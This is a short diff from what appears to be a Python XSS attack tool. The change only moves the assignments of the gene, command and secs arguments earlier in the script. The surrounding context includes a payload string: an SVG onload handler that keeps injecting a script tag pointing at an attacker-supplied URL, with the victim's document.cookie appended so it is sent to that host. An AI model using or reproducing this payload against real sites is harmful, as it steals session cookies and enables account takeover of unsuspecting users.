@@ -42,6 +42,9 @@ args = parser.parse_args()
 
 host = args.host
 target = args.target
+gene = args.gene
+cmd = args.command
+secs = args.secs
     
 try:
     port = int(format(args.port))
@@ -64,10 +67,6 @@ if args.quiet:
     uprint = str
 else:
     uprint = print
-
-gene = args.gene
-cmd = args.command
-secs = args.secs
     
 payload = '''
     - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="{0}?".concat(document.cookie)}},1010)>
